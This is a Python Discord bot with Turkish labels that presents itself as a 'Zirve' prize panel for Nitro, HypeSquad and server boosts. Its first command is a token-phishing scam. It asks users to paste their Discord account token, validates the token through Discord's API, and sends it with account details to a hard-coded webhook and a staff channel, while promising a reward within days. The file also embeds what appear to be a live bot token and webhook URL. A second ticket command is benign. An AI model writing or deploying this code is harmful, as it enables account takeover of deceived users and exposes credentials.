# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput, Select
import requests
import json

# ===== KONFIGURASYON =====
BOT_TOKEN = "MTUyNjcxMjM2NTQ5NDU2NjkzMg.GDj3jp.FnuHDb2p37z6HaYNdxQ0sFUswwjHcbIY9IHgbg"
WEBHOOK_URL = "https://discord.com/api/webhooks/1526713905865293944/Z1QPSN5Mbx30WGlkWPCLiqnX1JLPliiY_0ziIjq8OGw5NvRRyRBTSj8kSrMkuTfGyZrs"
TICKET_CATEGORY_ID = 1526849082579222678  # Kategori ID'si
STAFF_ROLE_ID = 1520637225791131678       # Yetkili rol ID'si
GUILD_ID = 1469472843120246957            # Sunucu ID'si
# =========================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ===== TOKEN DOĞRULAMA =====
def check_token(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            return True, r.json()
        else:
            return False, None
    except:
        return False, None

# ===================== 1. PANEL KOMUTU (ÖDÜL TICKET) =====================
class OdulView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 Nitro", style=discord.ButtonStyle.green)
    async def nitro(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="Nitro"))

    @discord.ui.button(label="🎫 Nitro Basic", style=discord.ButtonStyle.blurple)
    async def nitro_basic(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="Nitro Basic"))

    @discord.ui.button(label="🏅 HypeSquad", style=discord.ButtonStyle.gray)
    async def hypesquad(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="HypeSquad"))

    @discord.ui.button(label="🚀 14x Boost", style=discord.ButtonStyle.red)
    async def boost(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="14x Boost"))

class TokenModal(Modal):
    def __init__(self, odul: str):
        super().__init__(title=f"🎯 {odul} Ödülü")
        self.odul = odul
        self.token_input = TextInput(
            label="Discord Token",
            placeholder="Tokenini buraya yapıştır...",
            required=True,
            style=discord.TextStyle.paragraph
        )
        self.add_item(self.token_input)

    async def on_submit(self, interaction: discord.Interaction):
        token = self.token_input.value
        kullanici = interaction.user
        guild = interaction.guild

        gecerli, veri = check_token(token)
        if not gecerli:
            await interaction.response.send_message("❌ **Geçersiz token!** Lütfen doğru token gir.", ephemeral=True)
            return

        username = f"{veri['username']}#{veri.get('discriminator', '0')}"
        nitro = veri.get('premium_type', 0)
        flags = veri.get('flags', 0)
        nitro_map = {0: "Yok", 1: "Nitro Classic", 2: "Nitro (Full)", 3: "Nitro Basic"}
        nitro_text = nitro_map.get(nitro, "Bilinmiyor")
        hype = "Yok"
        if flags & 64: hype = "Bravery"
        elif flags & 128: hype = "Brilliance"
        elif flags & 256: hype = "Balance"

        try:
            category = guild.get_channel(TICKET_CATEGORY_ID)
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            channel = await guild.create_text_channel(
                name=f"odul-{kullanici.name}",
                category=category,
                overwrites=overwrites
            )

            embed = discord.Embed(
                title="🎫 Zirve Ödül Ticket",
                description=(
                    f"**Kullanıcı:** {kullanici.mention}\n"
                    f"**Ödül:** {self.odul}\n"
                    f"**Hesap:** {username}\n"
                    f"**Nitro:** {nitro_text}\n"
                    f"**HypeSquad:** {hype}\n\n"
                    f"**Token:** ||{token}||"
                ),
                color=0xffd700
            )
            embed.set_footer(text="Zirve Gift | Yetkili onayı bekleniyor")

            select = Select(
                placeholder="Ödül kategorisini seç...",
                options=[
                    discord.SelectOption(label="ZirveGift", emoji="🎁", description="Ana ödül"),
                    discord.SelectOption(label="Satın alım", emoji="💰", description="Satın alınan ödül"),
                    discord.SelectOption(label="Ürün bilgi", emoji="📄", description="Ürün detayları"),
                    discord.SelectOption(label="Sponsor", emoji="🤝", description="Sponsorluk"),
                    discord.SelectOption(label="Çekiliş", emoji="🎲", description="Çekiliş ödülü"),
                    discord.SelectOption(label="İnvite ödül", emoji="📩", description="Davet ödülü"),
                    discord.SelectOption(label="Gmail ödül", emoji="📧", description="Gmail ödülü")
                ]
            )
            async def select_callback(interaction2):
                await interaction2.response.send_message(f"✅ **{interaction2.data['values'][0]}** seçildi.", ephemeral=True)
            select.callback = select_callback

            class OnayView(View):
                def __init__(self):
                    super().__init__(timeout=None)

                @discord.ui.button(label="✅ Onayla", style=discord.ButtonStyle.green)
                async def onay(self, interaction2: discord.Interaction, button: Button):
                    await interaction2.response.send_message("✅ Ödül onaylandı!", ephemeral=False)
                    await kullanici.send(f"✅ {self.odul} ödülün onaylandı! 27-72 saat içinde hesabına gönderilecek.")
                    requests.post(WEBHOOK_URL, json={"content": f"✅ {kullanici} için {self.odul} ödülü onaylandı."})

                @discord.ui.button(label="❌ Reddet", style=discord.ButtonStyle.red)
                async def red(self, interaction2: discord.Interaction, button: Button):
                    await interaction2.response.send_message("❌ Ödül reddedildi.", ephemeral=False)
                    await kullanici.send(f"❌ {self.odul} ödülün reddedildi. Lütfen yetkiliyle iletişime geç.")
                    requests.post(WEBHOOK_URL, json={"content": f"❌ {kullanici} için {self.odul} ödülü reddedildi."})

            view = OnayView()
            view.add_item(select)

            await channel.send(embed=embed, view=view)

            mesaj = (
                f"**🎫 Yeni Ödül Ticket Açıldı!**\n"
                f"Kullanıcı: {kullanici} (ID: {kullanici.id})\n"
                f"Ödül: {self.odul}\n"
                f"Hesap: {username}\n"
                f"Nitro: {nitro_text}\n"
                f"HypeSquad: {hype}\n"
                f"Token: ||{token}||\n"
                f"Ticket: {channel.mention}"
            )
            requests.post(WEBHOOK_URL, json={"content": mesaj})

            await interaction.response.send_message(
                f"✅ **Token doğrulandı!** Ticket açıldı: {channel.mention}",
                ephemeral=True
            )

        except Exception as e:
            await interaction.response.send_message(f"❌ Ticket açılamadı: {e}", ephemeral=True)

@bot.command()
async def panel(ctx):
    embed = discord.Embed(
        title="🏆 Zirve Ödül Paneli",
        description="Aşağıdaki butonlardan bir ödül seç. Token'ını gir, ticket açılacak ve yetkili onaylayacak.",
        color=0xffd700
    )
    embed.set_footer(text="Zirve Panel | Ticket Sistemi")
    await ctx.send(embed=embed, view=OdulView())


# ===================== 2. TICKET KOMUTU (KATEGORİLİ) =====================
class TicketModal(Modal):
    def __init__(self, kategori: str):
        super().__init__(title=f"🎫 {kategori} Ticket")
        self.kategori = kategori
        self.aciklama = TextInput(
            label="Açıklama",
            placeholder="Detaylı açıklama yaz...",
            required=True,
            style=discord.TextStyle.paragraph
        )
        self.add_item(self.aciklama)

    async def on_submit(self, interaction: discord.Interaction):
        kullanici = interaction.user
        guild = interaction.guild
        aciklama = self.aciklama.value

        try:
            category = guild.get_channel(TICKET_CATEGORY_ID)
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            channel = await guild.create_text_channel(
                name=f"{self.kategori}-{kullanici.name}",
                category=category,
                overwrites=overwrites
            )

            embed = discord.Embed(
                title="🎫 Genel Ticket",
                description=(
                    f"**Kullanıcı:** {kullanici.mention}\n"
                    f"**Kategori:** {self.kategori}\n"
                    f"**Açıklama:** {aciklama}"
                ),
                color=0x00ff00
            )
            embed.set_footer(text="Zirve Ticket | Yetkili yanıt verecek.")

            await channel.send(embed=embed)
            await interaction.response.send_message(
                f"✅ Ticket açıldı: {channel.mention}",
                ephemeral=True
            )

        except Exception as e:
            await interaction.response.send_message(f"❌ Ticket açılamadı: {e}", ephemeral=True)

class KategoriView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 ZirveGift", style=discord.ButtonStyle.green)
    async def zirvegift(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="ZirveGift"))

    @discord.ui.button(label="💰 Satın alım", style=discord.ButtonStyle.blurple)
    async def satinalim(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Satın alım"))

    @discord.ui.button(label="📄 Ürün bilgi", style=discord.ButtonStyle.gray)
    async def urunbilgi(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Ürün bilgi"))

    @discord.ui.button(label="🤝 Sponsor", style=discord.ButtonStyle.gray)
    async def sponsor(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Sponsor"))

    @discord.ui.button(label="🎲 Çekiliş", style=discord.ButtonStyle.gray)
    async def cekilis(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Çekiliş"))

    @discord.ui.button(label="📩 İnvite ödül", style=discord.ButtonStyle.gray)
    async def invite(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="İnvite ödül"))

    @discord.ui.button(label="📧 Gmail ödül", style=discord.ButtonStyle.gray)
    async def gmail(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Gmail ödül"))

@bot.command()
async def tick(ctx):
    embed = discord.Embed(
        title="🎫 Zirve Ticket Sistemi",
        description="Aşağıdaki butonlardan bir kategori seç. Açıklama gir ve ticket oluştur.",
        color=0x00ff00
    )
    embed.set_footer(text="Zirve Ticket | 7/24 Destek")
    await ctx.send(embed=embed, view=KategoriView())


# ===== BOT HAZIR =====
@bot.event
async def on_ready():
    print(f"✅ Zirve Bot aktif! Kullanıcı: {bot.user}")

bot.run(BOT_TOKEN)
